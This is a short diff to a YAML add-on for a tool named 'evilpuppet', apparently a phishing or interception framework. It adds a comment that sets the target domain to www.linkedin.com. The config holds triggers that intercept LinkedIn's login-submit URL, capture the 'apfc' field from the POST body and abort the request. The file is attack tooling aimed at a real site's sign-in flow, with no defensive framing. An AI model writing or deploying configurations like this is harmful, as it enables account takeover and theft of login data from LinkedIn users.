@@ -1,4 +1,5 @@
 # evilpuppet add-on for target site
+# domain = ['www.linkedin.com']
 
 evilpuppet:
   triggers:
@@ -25,3 +26,4 @@ evilpuppet:
       url_re: '/checkpoint/lg/login-submit'
       post_re: 'apfc=([^&]*)'
       abort: true
+
